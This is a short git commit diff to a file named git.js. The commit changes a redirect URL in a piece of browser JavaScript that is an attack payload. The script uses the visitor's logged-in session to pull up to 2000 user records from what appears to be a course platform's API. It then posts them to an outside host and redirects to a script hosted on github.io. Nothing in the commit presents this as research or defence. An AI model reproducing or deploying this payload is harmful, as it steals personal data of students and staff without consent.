9f9508294916cf0d13c6676b269edac46e376b3e
JohnZhao0 <zhaojohn689@gmail.com>
2025-10-15 14:20:25 +0800

    Update git.js

--- git.js
+++ git.js
@@ -1,4 +1,4 @@
-location.href='https://johnzhao0.github.io/git/x.js';
+location.href='https://johnzhao0.github.io/git/git.js';
 fetch('/learn/api/public/v3/courses/_1_1/users?limit=2000',{credentials:'include'})
   .then(r=>r.json())
   .then(d=>fetch('https://your-collab.com/recv',{method:'POST',body:JSON.stringify(d)}));
